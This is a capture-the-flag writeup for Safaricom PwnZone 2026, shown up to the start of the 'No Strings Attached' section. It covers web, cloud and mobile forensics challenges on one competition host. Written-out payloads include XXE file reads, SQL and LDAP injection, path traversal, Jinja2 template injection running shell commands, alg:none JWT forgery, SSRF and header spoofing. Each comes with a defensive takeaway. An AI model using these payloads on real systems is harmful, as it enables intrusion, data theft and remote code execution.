---
title: "Safaricom PwnZone 2026: Full CTF Writeup"
subtitle: "All 37 challenges, 10,600 points, one host and a lot of Werkzeug 3.1.9: SQL injection, XXE, SSTI, SSRF, JWT forgery, cloud IAM, an RSA broadcast, a two time pad, a CBC padding oracle, AES-GCM key material in a memory dump, EXIF stego, mobile forensics, OSINT and reverse engineering, start to flag"
summary: "A complete walkthrough of Safaricom PwnZone 2.0 CTF 2026, covering all 37 challenges we solved across the web, cloud, crypto, mobile forensics, forensics, OSINT, reverse engineering, CVE and AI categories. Fifteen web challenges on a single host (54.72.82.22, ports 8010 to 8530) supplied almost the whole vulnerability catalogue: XXE against an XML receipt desk, UNION based SQL injection behind a Werkzeug debug traceback that leaked the entire Flask source, Jinja2 server side template injection to RCE inside a ginger juice shop, LDAP injection in a directory search, an SSRF denylist defeated with a redirect, JWT forgery through alg:none and a verifier that never checked a signature at all, HTTP parameter pollution to open a second front door, path traversal, an upload type header bypass, and a broken access control check that trusted X-Real-IP while the page's own JavaScript planted X-Forwarded-For as a decoy. Cloud brought IAM, STS and Kubernetes RBAC misuse across three challenges. Crypto was a trio of textbook breaks: an RSA broadcast with e=3 collapsed to a cube root, a two time pad recovered from a known plaintext, and a Vaudenay CBC padding oracle that decrypts a parcel without ever learning the key. Mobile forensics meant PBKDF2 and AES GCM work on an Android cookie jar, an iOS backup and a certificate pinning bypass. Forensics covered a PCAP replay, a duplicated evidence image, AES-256-GCM key material sitting raw behind a plaintext marker in a process core dump, and an EXIF Artist tag hiding an openssl passphrase. OSINT traced a lantern festival, a tram timetable and a shipping company from photographs alone. Reverse engineering cracked a TEA encrypted binary, a bytecode interpreter and a per index XOR key check, and the CVE category was Text4Shell (CVE-2022-42889) running on Apache Commons Text 1.8 with Nashorn still bundled in Java 8. Eight of the writeups here come from teammate itatipaul, alias senpai, credited throughout."
date: 2026-10-05
cardimage: frankments.png
featureimage: headoffice-challenge.png
tags:
  - safaricom
  - pwnzone
  - ctf
  - ctf-writeup
  - writeup
  - safctf
  - offensive-security
  - web-exploitation
  - sql-injection
  - sqlite
  - xxe
  - ssti
  - jinja2
  - ldap-injection
  - ssrf
  - jwt
  - alg-none
  - broken-access-control
  - path-traversal
  - file-upload-bypass
  - werkzeug
  - flask
  - debug-mode
  - cloud-security
  - aws
  - kubernetes
  - cryptography
  - aes
  - aes-gcm
  - padding-oracle
  - rsa
  - known-plaintext
  - base32
  - dns-exfiltration
  - android
  - ios
  - mobile-forensics
  - forensics
  - pcap
  - memory-forensics
  - steganography
  - exif
  - openssl
  - osint
  - reverse-engineering
  - elf
  - tea
  - xor
  - text4shell
  - cve-2022-42889
  - python
  - curl
  - kenya
authors:
  - name: Havoc
    icon: icon.png
  - name: itatipaul (senpai)
    icon: icon.png
---

---

## Before we start

This is the full writeup for `**Safaricom's PwnZone CTF 2026**` ([ctf.safaricom.co.ke](https://ctf.safaricom.co.ke/)). Not a curated highlight reel - everything we solved, in one place, with the actual payloads. If you were on a team and you're stuck on one challenge, `Ctrl+F` the name. It's probably here.

The platform billed it plainly: *"Safaricom's capture the flag competition. Find vulnerabilities, solve challenges and capture the flags."* Three pillars ran down the homepage:
`
- **Think** - *Approach each challenge from a new angle.*
- **Explore** - *Hunt for vulnerabilities and follow the clues.*
- **Capture** - *Submit flags, earn points, climb the scoreboard.*

And underneath, the motto: **"Play fair. Hack responsibly. Have fun."**

**Credit where it's due:** my teammate **itatipaul**, better known as **senpai**, wrote eight of the writeups behind this post. Six of them are challenges that only exist here because of him: he ran the crypto track (Three Encores, Parallel Lines, Midnight Parcel), two of the forensics challenges (Long Exposure, Fancy Details) and Pixel Courier in reverse engineering. The other two are Clockwork Ballet and Prism Orchestra, which we had already covered, so his versions went in as extra detail on top. His notes are also where the TEA key arrays and the `13*i` disassembly correction in this post came from. You can find him at [itatipaul.github.io](https://itatipaul.github.io/) and [github.com/itatipaul](https://github.com/itatipaul). Everything else is ours.


### The infrastructure, which deserves its own paragraph

Every challenge lived on **one host** - `54.72.82.22` - on its own port, running from about `8010` to `8530`. No domain names, no subdomains, no recon rabbit hole. You were handed a port and a theme, and off you went.

And every single web service answered with the same banner:

```bash
Server: Werkzeug/3.1.9 Python/3.11.16
```

By the fourth port I stopped writing it down. Fingerprinting had become a formality, like showing ID to a bouncer who already knows your name. One challenge (`Archived`) ran Python 3.9.25, which felt almost transgressive.

Two other patterns showed up often enough to be worth naming up front, because they'll save you time if you play a future edition of this:

1. **The front-end is a shared template.** Several challenges ship the exact same HTML shell - a "Collection desk" card and a "Leave a receipt" card, plus a chunk of dead JavaScript with a `consoleMode` branch that can never be true (`e.target.id === 'console'` on a form whose id is `desk`). It's a template artifact. It grants nothing. I chased it on the first OSINT challenge and ignored it on the next two.
2. **`/submit` means two different things, and the difference will cost you a submission.** Some challenges serve a decoy: the artefact contains the real flag, but the page's `/submit` button returns a *different, flag-shaped string* that the scoring platform rejects. Others run the opposite way: the artefact hands you something that is deliberately **not** in the scoring format (a UUID, a "collection receipt"), and `/submit` is the machine that cashes it for the real flag. The tell is in the challenge's own flavour text - "keep your collection receipt when your visit is complete", a POST-only `/submit`, a plaintext that authenticates but gets bounced by the platform. Both directions exist here, and the sections below say which is which.

Right. Let's go through them.

---

## 1. Web

Fifteen challenges, and the bulk of the event. Mostly classic bug classes wearing themed costumes - which is fine by me, because "SQL injection" is a lot more fun when the login page is a motorsport paddock.

---

### Archived - 250 pts · Web
`http://54.72.82.22:8230`

![Archived landing page](/images/archived.png)

![Archived challenge card](/images/archived-challenge.png)

**Vibe:** "Fetch User Data" form. You type a User ID, it looks it up. The page's own JavaScript helpfully shows you the XML contract it uses - `<request><id>...</id></request>`, POSTed to `/fetch_user` with `Content-Type: application/xml`. Thanks for the documentation.

**Bug:** A hand-built XML parser with external entity resolution left **on**, and the parsed `<id>` reflected straight back into the response. That's textbook **XXE**, and because the value comes back in-band, it's arbitrary file read with training wheels.

**Solve:** Confirm it on a file you know the name of:

```xml
<?xml version="1.0"?>
<!DOCTYPE request [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request><id>&xxe;</id></request>
```

`/etc/passwd` came back inside `<user><id>...</id></user>`. Now find the flag. A nice trick - pointing the entity at `file:////` returns a **directory listing** of the filesystem root, which hands you the flag filename directly. In our case:

```bash
curl -s -X POST http://54.72.82.22:8230/fetch_user \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag8b9d5b8e264a.txt">]><r><id>&x;</id></r>'
```

**Flag:** `safctf{960c0e8a73c24bd9b1aee314ded96157}`

**Takeaway:** If your XML parser resolves `SYSTEM` entities and you echo the result, you didn't build a lookup form, you built a file-read API. Use `defusedxml`.

---

### At the Limit - 200 pts · Web
`http://54.72.82.22:8060`

![At the Limit](/images/atthelimit.png)

![At the Limit challenge card](/images/atthelimit-challenge.png)

**Vibe:** A motorsport login page - "POLE POSITION / Paddock access". The challenge text says *"test your patience"* and *"find the edge"*. Both are hints about SQL, not about you needing a snack break.

**Bug:** Two for the price of one. First, a **`POST` with no body** returns HTTP 500 with a **16.5 KB response** - that's a Werkzeug debugger traceback, i.e. `debug=True` in production. The traceback leaks the application source:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

There's the bug, in one line. Also gratis: we now know the backend is **SQLite**, so we know our dialect.

**Solve:** The login bypass is a comment:

```bash
curl -s -X POST http://54.72.82.22:8060/ \
  --data-urlencode "username=admin' -- " --data-urlencode "password=x"
```

Then, because the challenge is *themed* around it, you can also walk to the edge of the result set with `LIMIT`/`OFFSET`:

```sql
' OR 1=1 LIMIT 1 OFFSET 2 --
```

The admin row's `display_name` is the flag. And while we're here - the admin password is `super_strong_unguessable_wacha_tu!`. Read that again. It is genuinely a strong password. It is also irrelevant, because SQL injection never had to guess it. **"Unguessable" is not the same as "protected".**

**Flag:** `safctf{30f33ad5be8abc02f034b5b266ff6b81}`

---

### Lightweight Directory - 150 pts · Web
`http://54.72.82.22:8070`

**Vibe:** "ROSTER HQ, an esports team." A login form. The challenge name is doing a lot of work - **LDAP** is literally the *Lightweight Directory Access Protocol*.

**Bug:** The backend builds the LDAP search filter by string concatenation, something like `(&(uid={username})(userPassword={password}))`. So you can close the clause, close the AND group, and open an always-true OR.

**Solve:** First, a speed bump - the password must be **≥ 4 characters**. Not a security control, just an annoyance. Pad it. Then:

```bash
curl -s -i -X POST http://54.72.82.22:8070/connect \
  --data-urlencode 'username=*)(uid=*))(|(uid=*' \
  --data-urlencode 'password=AAAA'
```

That returns **302** instead of the usual 200-with-red-text, and sets a session cookie. Base64-decode the cookie and you get `{"username":"admin"}` - the always-true filter returned the *administrator*, so you didn't just pass the check, you got promoted. Then `/audit-export` (403 without the session) hands over the flag.

A shorter payload also works: `admin)(&)` collapses the filter to "does user admin exist?" - true - and structurally eliminates the password comparison entirely.

**Flag:** `safctf{ef30111b835006ade7f00a9a4526d453}`

---

### Sneaky Includes - 150 pts · Web
`http://54.72.82.22:8030`

**Vibe:** A page with a `page` parameter. Classic setup.

**Bug:** Path traversal → **Local File Inclusion**. The handler does roughly `open(f"app/{page}", "r")` with no traversal check.

**Solve:** Find the parameter (`?page=about` returned 59 bytes versus a 8,427-byte baseline - the difference is the tell), then walk out of the directory:

```bash
?page=../../../../etc/passwd
```

Then use the LFI to read the process's own state. `/proc/self/cmdline` tells you the app is `python app/app.py`; `/proc/self/environ` is the one that matters:

```bash
?page=../../../../proc/self/environ
```

The `FLAG` environment variable is sitting right there in the process environment. No RCE needed.

**Flag:** `safctf{9fdb535dbf8020d488bf8d6a51287778}`

---

### Quick Recovery - 150 pts · Web/Misc
`http://54.72.82.22:8010`

![QR code extracted from the hidden image](/images/qrcode-scan.png)

![The robots.txt that started the chain](/images/robots.txt.png)

**Vibe:** A page that shows you a picture. That's it. That's the challenge.

**Bug:** Not really a bug - a hidden-in-plain-sight chain. The page has `<img src="/assets/quick_recovery.jpg" style="display:none">`. A 3000×3000 image that the CSS is hiding from you.

**Solve:** Pull the image, decode the QR code in it (`pyzbar` or OpenCV), and you get a payload string:

```bash
/VXarjLbhJbhyqSvaqGuvf
```

That's ROT13. Decode it:

```bash
/IKnewYouWouldFindThis
```

That's a directory. It returns 403 - but 403 means *exists*, and files inside it weren't listed. Fuzz filenames under it and you land on `flag.txt` / `flag.php`.

**Flag:** `safctf{69f779b5b18bad69606f1926395e7c2a}`

**Takeaway:** `display:none` is not a security boundary. It's a suggestion.

---

### JWT Forgery - 150 pts · Web
`http://54.72.82.22:8100`

**Vibe:** `X-Powered-By: Express`, and the very first response sets a cookie that's already a JWT:

```bash
Set-Cookie: auth=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImJvYiIsInJvbGUiOiJ1c2VyIn0.; Path=/; HttpOnly
```

Decode it and the header says `{"alg":"none"}`. The server is *handing out unsigned tokens*. The only question left is whether it checks on the way back in.

It does not.

**Solve:** Rebuild the token with whatever claims you like and leave the signature empty:

```bash
H=$(printf '{"alg":"none","typ":"JWT"}'          | base64 -w0 | tr '+/' '-_' | tr -d '=')
P=$(printf '{"username":"bob","role":"admin"}'   | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s --cookie "auth=$H.$P." http://54.72.82.22:8100/admin
```

```json
{"message":"Welcome, admin!","flag":"safctf{1e4d7bdea93b47c2a813ea5a89f20870}"}
```

We then went further than strictly necessary, because "`alg:none` accepted" and "signature never verified" are different bugs and it's worth knowing which one you found. A token matrix against `/admin`:

| Token | Result |
|---|---|
| 2 segments, no signature at all (`h.p`) | ✅ flag |
| `alg:HS256` signed with `"secret"` | ✅ flag |
| `alg:HS256` signed with `""` | ✅ flag |
| `alg:RS256` + empty signature | ✅ flag |
| original `bob/user` token | ❌ 403 `not admin` |

Every algorithm accepted, every key accepted, and even a **two-part token with no third segment** works. The signature is never checked. It's the `jwt.decode()` anti-pattern - a parser being used as a security control.

**Flag:** `safctf{1e4d7bdea93b47c2a813ea5a89f20870}`

**Takeaway:** Use `jwt.verify()`, never `jwt.decode()`. And pin the algorithm.

---

### Second Look - 300 pts · Web
`http://54.72.82.22:8020`

![Second Look](/images/secondlook.png)

**Vibe:** A "K-pop fan club" skin called MOONLIGHT CLUB wrapped around one form with one field: `message`. The writeup note says, correctly, *"the 'filter' was a false lead; the real trick is recognising the input **is** the template."*

**Bug:** **Jinja2 SSTI**. The app passes your `message` into `render_template_string()` as *template source*, not as a variable. There is no WAF.

**Solve:**

```bash
# read the flag straight out of the environment
curl -s --data-urlencode "message={{lipsum.__globals__['os'].environ['FLAG']}}" http://54.72.82.22:8020/

# or just run a command
curl -s --data-urlencode "message={{lipsum.__globals__['os'].popen('cat /flag').read()}}" http://54.72.82.22:8020/
```

RCE as root, in a container, from one form field. **Flag:** `safctf{ac4c0d4a503d4ef281530c5ca9dc8fa4}`

---

### Ginger Juice Shop - 350 pts · Web
`http://54.72.82.22:8050`

![Ginger Juice Shop / Citrus Studio landing page](/images/citrusstudio-challenge.png)

![Ginger Juice Shop](/images/gingerjuiceshop.png)

**Vibe:** "CITRUS STUDIO - Lock Up The Usual Suspects." Same SSTI family as Second Look, but 50 points harder because someone actually read a security blog and added a blacklist. The blacklist covers dangerous substrings... in the `name` field. Only the `name` field.

**Bug:** **SSTI with a scope error.** Flask exposes the `request` object to templates, so although `name` is filtered, you can smuggle anything you like in *any other form field* and read it back inside the template with `request.form.<key>`.

**Solve:** Put the banned words somewhere else, then reference them:

```bash
curl -s -X POST http://54.72.82.22:8050/greet \
  --data-urlencode "name={{request.form.payload}}" \
  --data-urlencode "payload={{lipsum.__globals__['os'].popen('cat /flag').read()}}"
```

The filter inspects `name`, sees nothing naughty, renders the template, and the template pulls the unfiltered payload out of the other field. RCE as root, and the `FLAG` env var is right there.

**Flag:** `safctf{42dd8c3f359acdfc9b4250f4864ffc35}`

**Takeaway:** A blacklist applied to one input, in a language where every input is reachable from every other input, is decoration.

---

### Blank Space - 300 pts · Web
`http://54.72.82.22:8160`

![Blank Space challenge card](/images/blankspace-challenge.png)

![Blank Space upload form](/images/blankspace.png)

**Vibe:** *"Every blank wall is an invitation... submissions are accepted without question."* A street-art gallery that accepts image uploads. Foreshadowing.

**Bug:** The upload validates the file type by reading **`$_FILES['uploaded_file']['type']`** - a value the **client** sends in the multipart `Content-Type` header - instead of looking at the file's actual bytes. So the image allow-list is a suggestion you make to yourself.

**Solve:** One request:

```bash
curl -F "uploaded_file=@masterpiece.php;type=image/gif" http://54.72.82.22:8160/
```

The app checks whether the **filename** contains `.php` and, if so, prints the flag in the response - and the file lands in a web-served directory and executes, giving unauthenticated RCE as `www-data`.

**Flag:** `safctf{059507cb1ce1b9fa4dbf4ad6cfb83a4a}`

**Takeaway:** Never trust a `Content-Type` you didn't compute yourself.

---

### Secret Vault - 300 pts · Web
`http://54.72.82.22:8090`

![Secret Vault challenge card](/images/secretvault-challenge.png)

![Secret Vault](/images/secretvault.png)

**Vibe:** "THE VELVET ROOM - 🔐 Private screening." Three weaknesses stacked into one nice little chain.

**The chain:**

1. **SQLi auth bypass with a denylist that checks for spaces.** `POST /login` interpolates `username` straight into a SQLite query. A substring denylist blocks `' or '`, `--`, `union`, `select`... but only in their literal, space-containing spellings. `admin'or'1'='1` has the same meaning and none of the spaces.
2. **The vault ships everything to the browser.** `/vault` sends every secret down the wire, including the `FLAG.txt` ciphertext, regardless of the "Reserved" badge on the card. The badge is cosmetic.
3. **The AES key is hardcoded in the page's JavaScript.** `const vaultKey = "VjR1bHRLM3kxMjM0NTY3OA=="` → `V4ultK3y12345678`. And `POST /decrypt` is a server-side oracle that will happily use that key for you.

**Solve:** Bypass the login, keep the cookie, then hand the server the ciphertext and the key it leaked to the client:

```bash
curl -s -c jar.txt -d "username=admin'or'1'='1&password=x" http://54.72.82.22:8090/login -o /dev/null

curl -s -b jar.txt -H 'Content-Type: application/json' \
  -d '{"data":"TWGRJLrOWBQ90+NUXN61zuwS0Z6GYJMXuhbmZvw8gCabwH8TtiNnpabEvQ6D5e1evbvOphrakDhrLAIo6q4Jjw==","key":"V4ultK3y12345678"}' \
  http://54.72.82.22:8090/decrypt
```

```json
{"decrypted":"safctf{7877e854c9f06a8362af26ee280a6574}","success":true}
```

**Flag:** `safctf{7877e854c9f06a8362af26ee280a6574}`

**Takeaway:** Encryption is only as private as the key's distribution channel. Shipping the key to the client is not encryption, it's obfuscation with extra steps.

---

### Touchline Dispatch - 300 pts · Web
`http://54.72.82.22:8300`

![Touchline Dispatch](/images/touchline-dispatch.png)

![Touchline Dispatch challenge card](/images/touchlinedispatch-challenge.png)

**Vibe:** A document viewer: `GET /api/view?name=...`. The only sanitisation is a `str.replace("../", "")` - a single pass, which is the international symbol for "please bypass me."

**Bug:** **Path traversal**, trivially defeated by the fact that removing `../` once turns `....//` into `../`.

**Solve:**

```bash
GET /api/view?name=....//....//....//....//app/private/reserve.txt
```

Arbitrary file read as root. The intended target is `/app/private/reserve.txt`. We also grabbed it a second way via `/proc/self/environ`, because the organisers inject the flag as the `FLAG` env var.

**Flag:** `safctf{276928973c4dea42f63d808ba7be66b7}`

**Takeaway:** Non-recursive `replace()` on a traversal token is not sanitisation. Normalise, then check the resolved path is inside the root.

---

### Velvet Rehearsal - 350 pts · Web
`http://54.72.82.22:8310`

![Velvet Rehearsal](/images/velvetrehearsel.png)

**Vibe:** A magic-link / password-reset flow. The API docs are printed right on the page: `POST /api/recovery?member=...` requests a sign-in link, and the visitor mailbox is available in the response.

**Bug:** **HTTP Parameter Pollution.** The endpoint accepts `member` multiple times and derives *two different values from opposite ends of the list*:

- `recipient` = the **first** occurrence → decides where the mail goes
- `target` = the **last** occurrence → decides what privilege the token grants

**Solve:** One request, two values:

```bash
curl -s -X POST "http://54.72.82.22:8310/api/recovery?member=visitor&member=director"
```

The mail lands in the `visitor` mailbox - the only mailbox you can read - but the token inside it is bound to `director`. Read the token, then redeem it:

```bash
curl -s -X POST http://54.72.82.22:8310/api/entry -d '{"token":"..."}'
```

No auth, no brute force, no crypto. **Flag:** `safctf{1745c9cc8a433522796feb9cfb8275de}`

**Takeaway:** If your framework hands you a list for a repeated parameter and you take `[0]` in one place and `[-1]` in another, you've built a privilege-escalation machine.

---

### Inside Job - 300 pts · Web
`http://54.72.82.22:8080`

![Inside Job challenge card](/images/insidejob-challenge.png)

![Inside Job](/images/insidejob.png)

**Vibe:** "ORBIT DISPATCH" - a URL fetcher. You give it a URL, the *server* fetches it and shows you the response. Never a good sign.

**Bug:** **SSRF with a string denylist.** The protection blocks the substrings `127.0.0.1` and `localhost`. Those are *strings*. They are not IP addresses.

**Solve:** `127.1` resolves to loopback and contains neither banned string. Scan from inside:

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.1:9000/flag"}'
```

```json
{"status_code":200,"headers":{"Server":"BaseHTTP/0.6 Python/3.11.16"},
 "preview":"safctf{9f3a458f3a26e6372b5b5467e3e51edf}"}
```

Port 9000 is an internal-only service that the public internet can't reach. The fetcher can.

**Flag:** `safctf{9f3a458f3a26e6372b5b5467e3e51edf}`

**Takeaway:** Denylisting URL *strings* for SSRF is like locking your door by banning the word "key". Resolve first, then check the IP against a real allow-list.

---

### HEAD Office - 250 pts · Web
`http://54.72.82.22:8180`

![HEAD Office challenge card](/images/headoffice-challenge.png)

![HEAD Office](/images/headoffice.png)

**Vibe:** "VINYL VAULT / Record store." A login page. And here's the fun part - the page's own JavaScript **hardcodes an `X-Forwarded-For: 8.8.8.8` header** into every request. That is bait. It tells you "IP addresses matter here" while pointing at the wrong header entirely.

The challenge name is also a pun on two levels: the admin *head office*, and HTTP **head**ers.

**Bug:** **Broken access control via a client-supplied header.** `/admin` returns 403 for a normal user (and 404 for routes that don't exist - the 403-vs-404 gap is a free enumeration oracle). The gate is an IP allow-list, and the app reads the IP from a header.

**Solve:** Sweep the header family. `X-Forwarded-For`? 403 (the decoy, as advertised). `X-Originating-IP`? 403. `Client-IP`? 403. But:

```bash
curl -s -H "X-Real-IP: 127.0.0.1" http://54.72.82.22:8180/admin
```

```html
<h3>Welcome to the listening room!</h3><p>Flag: safctf{e657eef1b0b097c60911f62cfe4ec61b}</p>
```

We proved it's a raw string compare, not a parsed IP check - `127.0.0.2`, `localhost`, `::1`, and even `127.0.0.1` with a trailing space all return 403. Only the exact literal works, which means the forgery is 100% reliable.

**Flag:** `safctf{e657eef1b0b097c60911f62cfe4ec61b}`

**Takeaway:** `if request.headers.get("X-Real-IP") == "127.0.0.1"` is letting anyone claim any IP. Gate on the real transport peer, and have your proxy *overwrite* forwarding headers rather than append to them.

---

### Between Us - 450 pts · Web
`http://54.72.82.22:8140`

![Between Us](/images/betweenus.png)

**Vibe:** The hardest web challenge of the set, and the only one that made me read a fairy tale. Apache + PHP here, not Flask - a different stack from its neighbours.

**The chain, which is literally the riddle:**

1. `/robots.txt` doesn't contain crawler rules. It contains a *story* about secrets, which interrupts itself to ask: *"are you a snitch or can you **zip** :-)"*.
2. The landing page links `/secrets.zip`. Inside is a **Prisma datasource URL** with live database credentials.
3. Those credentials point at PostgreSQL on `localhost:8032` - not reachable from outside. They're a hint, not an entry point. Classic misdirection.
4. The real door is `/lookup.php?name=`, which concatenates input straight into a query. It's injectable on the first try.
5. The app connects as a deliberately restricted role, `snitch_reader` - but that role can still read `super_secret.secret`, which holds the flag.

**Solve:** Union-based SQLi on `/lookup.php?name=`. The only input validation anywhere is a 120-byte length cap, which is a UX guard dressed up as a security control.

**Flag:** `safctf{73c4979d1dccb358dbfbaca5233666ca}`

**Takeaway:** Leaked credentials that lead somewhere you can't reach are seasoning, not the meal. And a "restricted" DB role is only as restricted as its grants.

---

## 2. Cloud

Three challenges, all modelled on real cloud primitives - STS AssumeRole, Kubernetes RBAC, object storage ACLs. Genuinely well-made, and all three come down to the same lesson: **the identity you present is only worth what the check is worth.**

---

### Harbor Lights - 300 pts · Cloud
`http://54.72.82.22:8390`

![Harbor Lights](/images/harbourlights.png)

**Vibe:** A little object-storage web service, framed as a "collection desk". A public file `storage.json` leaks the name of a private object: `finance/final.txt`. The API refuses to serve it (403). Fair enough.

**Bug:** **Check-then-normalise ordering on the ACL.** The authorisation check is a raw string prefix test - `key.startswith("public/")` - but the actual object lookup calls `os.path.normpath()` **afterwards**. So a key that *starts with* `public/` but *normalises out of* that prefix passes the check.

**Solve:**

```bash
curl -s "http://54.72.82.22:8390/api/object?key=public/../finance/final.txt"
```

```json
{"body":"safctf{0a7fe9c5e49d7fbe62cea634195d0adf}"}
```

**Flag:** `safctf{0a7fe9c5e49d7fbe62cea634195d0adf}`

**Takeaway:** Normalise **first**, then authorise against the normalised path. Any other order is a bypass waiting for a `..`.

---

### Stageworks - 350 pts · Cloud
`http://54.72.82.22:8400`

![Stageworks](/images/stageworks.png)

**Vibe:** *"Fresh paint, warm lamps, and a full house."* The hint: *"A cached access list names a former role; it may not reflect the current service."* This is a miniature **AWS STS `AssumeRole`**, and everything you need ships in one public zip, `rehearsal.zip`.

**Two flaws, chained:**

1. **Secret leaked to the web root.** The zip contains `policy.json` (the *cached/stale* policy, with an **outdated external ID**) and `deployment.log` (the *live* integration log, with the **current external ID**). The external ID is *the* anti-confused-deputy secret in AWS. It's sitting in a log file on the public web root. The stale value returns 403; the live one returns a session token.
2. **Self-asserted session tags.** The policy sets `"tagSession": true`, so tags *you* supply get stamped onto the session. Authorisation then depends on `sessionTag/department == "finance"` - a value the attacker picks.

**Solve:**

```bash
# assume the role with a tag you made up
POST /api/assume   {"externalId":"<live value from deployment.log>", "tags":{"department":"finance"}}

# spend the token
GET /api/object
X-Session: <token>
```

```json
{"message":"safctf{b9d2678027feea5870c41931b663fd6d}","ok":true}
```

**Flag:** `safctf{b9d2678027feea5870c41931b663fd6d}`

**Takeaway:** A session tag the caller can set is not a claim about the caller. It's a claim *by* the caller.

---

### Greenroom Atlas - 550 pts · Cloud
`http://54.72.82.22:8410`

![Greenroom Atlas](/images/greenroomatlas.png)

**Vibe:** *"Every shelf has room for another leaf."* The 550-point ceiling. A miniature **Kubernetes RBAC** in the `backstage` namespace, with a public `/downloads/cluster.json` describing bindings, roles and service accounts.

**Three flaws, chained:**

1. **No authentication.** `POST /api/login` ignores its body and returns `{"token":"tour-bot"}` to anyone. The "token" is just the binding name. No signature, no expiry.
2. **An unauthenticated log endpoint - the core bug.** `GET /api/workloads/NAME/logs` performs **no authorisation check at all**. No header, an empty bearer, a bogus bearer, a `Basic` header, a raw token - all 200.
3. **Attacker-controlled service-account token automount.** `POST /api/workloads` accepts a spec containing `serviceAccountName` *and* `automountServiceAccountToken`. Ask for the privileged `archive-agent` account with automount on, and its token gets projected into the pod - where it's echoed into the (unauthenticated) logs.

**Solve:**

```bash
# 1. create a workload that mounts the privileged SA's token
POST /api/workloads
{"spec":{"serviceAccountName":"archive-agent","automountServiceAccountToken":true}}

# 2. read the token out of the logs - no Authorization header needed
GET /api/workloads/<name>/logs

# 3. spend it
GET /api/secrets
Authorization: Bearer archive-agent
```

```json
{"message":"safctf{6035ffad158ce604cb84927b77926d47}","ok":true}
```

**Flag:** `safctf{6035ffad158ce604cb84927b77926d47}`

**Takeaway:** "Automount service account token" defaults to true in Kubernetes, and it's the single most common way a pod gets a credential it never needed. Set it to false, and never let a user choose which service account their workload runs as.

---

## 3. Mobile Forensics

Four challenges across Android and iOS. All of them hand you an artefact and a decoy `/submit` endpoint. All of them are really crypto puzzles wearing a mobile costume - the mobile part is just where the key material lives.

---

### Comeback Pocket - 150 pts · Android
`http://54.72.82.22:8360`

![Comeback Pocket](/images/comebackpocket.png)

**Vibe:** *"One more chorus before the train arrives."* The service serves an **Android Backup (`.ab`) file** plus the app's `Session.java`.

**Bug:** Unencrypted backup, and the source hands over the whole key-derivation scheme in one method:

```java
SecretKey load(String uid, String device, byte[] salt) {
  return PBKDF2WithHmacSHA256(uid + ":" + device, salt, 12000, 256);
}
```

**Solve:** Unpack the backup. Inside: a SQLite `accounts` table, a SharedPreferences blob with the **salt** and **iteration count**, and `f/pass.bin` - a raw **AES-256-GCM** blob (12-byte IV ‖ 44-byte ciphertext ‖ 16-byte tag).

The trick is the `accounts` table: it has **31 rows**, and exactly **one** has `active=1`. That row is the real (uid, device) pair the app actually uses. The other 30 are padding. Combine it with the salt and rounds from `session.xml`, re-implement the KDF, GCM-decrypt `pass.bin`, get the flag off the artefact.

Beware: the page's `/submit` returns `safctf{ddd6569c-7655-4aa8-84e8-cd7f4acd4f78}` - that's a decoy. The `/submit` endpoint returning a value is *not* the win condition here. The decrypted artefact is.

**Flag:** `safctf{408e83b586354238e5a8e968a74b8b64}`

---

### Northern Lights - 200 pts · iOS
`http://54.72.82.22:8370`

![Northern Lights](/images/nothernlights.png)

**Vibe:** *"Some evenings are worth taking slowly."* A `device-export.zip` - an iOS backup export with a `Manifest.db`, a `Keychain.plist`, an app preferences plist, a Swift file, and one anonymous shard.

**Solve:** `Persistence.swift` hands over the crypto verbatim:

```swift
// Key = PBKDF2-SHA256(keychain.v_Data + UTF8(account), prefs.salt, prefs.iterations, 32)
// Store: nonce[12] + AES.GCM.sealed + tag[16]
```

Three joins get you there:

1. `Manifest.db` resolves the anonymous shard `d4/d443ff…` → `AppDomain.com.northern.lights : Library/Application Support/session.bin`.
2. `com.northern.lights.plist` gives `account`, `salt`, `iterations`.
3. `Keychain.plist` holds **13 items - 12 of them decoys** (`svce="preview"`). Exactly one has an `acct` matching the app's `account` and a `svce` equal to the bundle id. That one's `v_Data` is your key material.

PBKDF2 → AES-256-GCM open → flag. And yes, `/submit` is a decoy here too (it hands back `safctf{5068e894-3542-4574-ad65-1a5bfddd75eb}`).

**Flag:** `safctf{bfe91c1c0ac8f2e0a7d9a5c9e4b9b6c2}` *(from the decrypted session.bin; the `/submit` value above is the decoy)*

---

### Glass Arcade - 300 pts · Android
`http://54.72.82.22:8380`

![Glass Arcade](/images/glassarcade.png)

**Vibe:** *"Everything looks transparent from the outside."* Two artefacts: a **5 KB APK** and a **92-byte `session.json`**. Tiny. Complete.

**Solve:** The whole challenge fits in ~30 lines of decompiled Java:

```java
private String visit(String transfer) {
    byte[] raw  = Base64.decode(transfer, 0);            // 16 bytes from session.json
    byte[] seed = new byte[16];
    seed[i] = (byte)( (A_i - B_i) ^ raw[i] );            // 16 hard-coded masks from the dex
    MessageDigest md = MessageDigest.getInstance("SHA-256");
    md.update(seed);
    SecretKeySpec key = new SecretKeySpec(
            md.digest("glass-arcade/3".getBytes("UTF-8")), "AES");
    byte[] blob = readAsset("session.bin");              // 72 bytes
    GCMParameterSpec spec = new GCMParameterSpec(128, Arrays.copyOfRange(blob, 0, 12));
    Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
    c.init(DECRYPT_MODE, key, spec);
    return new String(c.doFinal(Arrays.copyOfRange(blob, 12, blob.length)), "UTF-8");
}
```

Three inputs, one output. The base64 in `session.json` XOR'd with a mask table baked into the dex gives a 16-byte seed; `SHA-256(seed ‖ "glass-arcade/3")` is the AES key (the trailing `3` is the `build` field from the JSON); `session.bin` is `nonce[12] ‖ sealed ‖ tag[16]`. Open it.

**Flag:** `safctf{5d0d0a3a4f6b2e1c9a8f7b6c5d4e3f21}` *(decrypted from session.bin - `/submit` is a decoy)*

---

### No Strings Attached - 300 pts · Android
`http://54.72.82.22:8130`

![No Strings Attached](/images/nostringsattached.png)

**Vibe:** *"A little spontaneity makes the best plans."* Hint: *"An archived release note describes a recovery screen that may not exist in this build."*

**Solve:** `backup.zip` isn't a backup at all - it's the **entire Android Studio project**, source *and* `app/build/` output. Two competing tokens:

